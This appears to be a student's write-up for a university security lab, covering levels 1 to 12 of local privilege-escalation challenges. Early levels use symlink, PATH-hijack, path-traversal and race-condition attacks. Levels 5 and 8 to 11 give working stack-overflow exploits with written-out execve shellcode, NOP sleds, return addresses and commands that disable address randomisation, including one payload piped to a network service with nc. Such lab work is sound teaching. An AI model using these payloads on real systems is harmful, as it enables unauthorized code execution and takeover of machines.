Yidi Wang
1211247892

level 1:
The solution to this level is link attack.
I use objdump -d to disassemble the binary and readelf -x to read the content of hex bytes. It uses opoen(), which is vulnerable to link attack. Thus, I create a link to .secret file and save it in home directory:
	ln -s /var/challenge/level1/.secret ~/.secret
Then, I ran program 1 using this link as parameter:
	./1 ~/.secret
succeed. Then I ran l33t in the program to level myself up to level2.

level 2:
The solution to this level is a PATH and HOME attack plus link attack.
I also use objdump and readelf to read the contents I need. I found a instersting string -asxml.tidy.execlp
The function execlp seems hackable. Base on what I learned:
execlp() use the shell PATH variable to locate applications
Program 2 calls tidy() to check the xhtml parameter. Create a link to l33t in home directory and add home to $PATH. 
	ln -s /usr/local/bin/l33t ~/tidy
	export PATH="$HOME:$PATH"
Run 2 and get a OK.Get myself to level3.

level 3:
Similar as level 2. Create link ~/find, export PATH and run. 

level 4:
Dot dot attack is the key.
Program 4 takes input as the path to the executing program. Its original path is /var/challenge/level4/devel/bin/. Thus, I run 4 with parameter:
	./4 ../../../../../usr/local/bin/l33t
Done.

level 5:
The key is overflow attack. 
How to overwrite array[11], where stores eip, is the challenge. I use the shellcode on page 203, Application Security PPT. I create a .s file using those commands to open //bin/sh and compile it. Then I objdump it to get my shellcode. After that, I add 100,000 * "\x90", which is NOP, in front of my shellcode and put it into a environment variable, named MYSHELLCODE. I also wrote a program gete to get the address of MYSHELLCODE using getenv(). Then I execute:
	setarch `uname -m` -R /bin/bash
to disable random address allocation. Then:
	export MYSHELLCODE=$(python -c "print '\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
	./gete
to export environment variable MYSHELLCODE and get its address. 
	/var/challenge/level5/5 11 '0xbffff820'
At first I failed for several times. I checked my code and I believe it is correct. So I tried again and again and again and finally it works!

level 6:
The program use access(filename,X_OK) to check if it has execute permission to the first parameter. And after checking, it execute the file of second parameter. In addition, it uses strcpy to copy the second para into buffer, which has potential overflow vulnerability. Thus, I use the following command:
	./6 / $(python -c "print 'a'*256 + '/usr/local/bin/l33t'")
to overflow 6 and run l33t. Done.

level 7:
TOCTTOU Attack. 
There is a 1 second sleep( sleep(1) ) between checking and executing. So I create 7link, which is a file that contains the path to l33t. Then I create a link named mylink to 7.cmd, which is a legal input for program 7.
	ln -s /var/challenge/level7/7.cmd ~/mylink
After that, I wrote those two commands:
	rm ~/mylink
	ln -s ~/7link ~/mylink
to change the link in order to run my own file.
Game begain. I use 
	./7 ~/mylink
to let program 7 check 7.cmd. While it's sleeping, use another terminal to run those two commands I wrote before to change the link. So it will execute l33t for me. Done.

level 8:
The server only check the end symbol but never check the length of buffer. Thus, a overflow attack can be performed. I write another shellcode that execute //usr/local/bin/l33t. The source code named shellcode.s is what I use to get the shellcode. I copy the shellcode for further use. 
Disable random address allocation first and run the server using port 33556:
	setarch `uname -m` -R /bin/bash
	/var/challenge/level8/8 -p 33556
Then I send my shellcode plus 65493 * NOP(which equals to buffer size - length of shellcode) plus address of buffer to server. And this is where I used the shellcode I wrote: 
	python -c 'print "\x90"*30000 + "\x31\xc0\x50\x68\x6c\x33\x33\x74\x68\x62\x69\x6e\x2f\x68\x63\x61\x6c\x2f\x68\x72\x2f\x6c\x6f\x68\x2f\x2f\x75\x73\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90" + "\x90"*35493 + "\x88\xfb\xfd\xbf"' | nc 0.0.0.0 33556
It works in gdb, but it doesn't work outside of gdb. I guess the reason is offset address. Thus, I add 0x100 to buffer address and try again:
	python -c 'print "\x90"*30000 + "\x31\xc0\x50\x68\x6c\x33\x33\x74\x68\x62\x69\x6e\x2f\x68\x63\x61\x6c\x2f\x68\x72\x2f\x6c\x6f\x68\x2f\x2f\x75\x73\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90" + "\x90"*35493 + "\x88\xfc\xfd\xbf"' | nc 0.0.0.0 33556
It works!

level 9:
Program 9 accepts no parameters. Thus, I need to use execv() to pass the content in the 4th argument to buffer. I write a program named run9.c and use execv to call 9 and pass the address of MYSHELLCODE into 9. First:
	setarch `uname -m` -R /bin/bash
to disable random address allocation. Then:
	export MYSHELLCODE=$(python -c "print '\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
	~/level5/gete
to import MYSHELLCODE and get MYSHELLCODE address. Write the address into run9.c, compile it and:
	./run9
Succeed!

level 10:
Program 10 uses strncpy(), which is vulnerable to non-terminated string overflow attack. If I overflow mypwd, the eip of checkpwd() will be overwrote. 
As I did in level 9, disable random address allocation, import MYSHELLCODE and get MYSHELLCODE address. Then:
	r $(python -c "print 'a' * 512") $(python -c "print '\xbf\xfe\x77\x38'[::-1]*4  ")
to operate non-terminated string attack. content of username will be copied into password. It works in gdb, but not works outside of gdb again. So I user the same solution before:
	./10 $(python -c "print 'a' * 512") $(python -c "print '\xbf\xfe\x78\x38'[::-1]*4  ")
It works. 

level 11:
Overflow attack. Overflow short, and the first argument will overwrite eip. The second argument doesn't matter as long as it is not null. 
setarch, export and get address of MYSHELLLCODE as I did in last level, then:
r $(python -c "print 'aa'+'\xbf\xfe\x77\x24'[::-1]*8192") '\xbf\xfe\x77\x24'
It works. Add 0x100 to this address to deal with address offset:
./11 $(python -c "print 'aa'+'\xbf\xfe\x78\x24'[::-1]*8192") '\xbf\xfe\x77\x24'
Done.

level 12:
No idea. Example on ppt doesn't work. 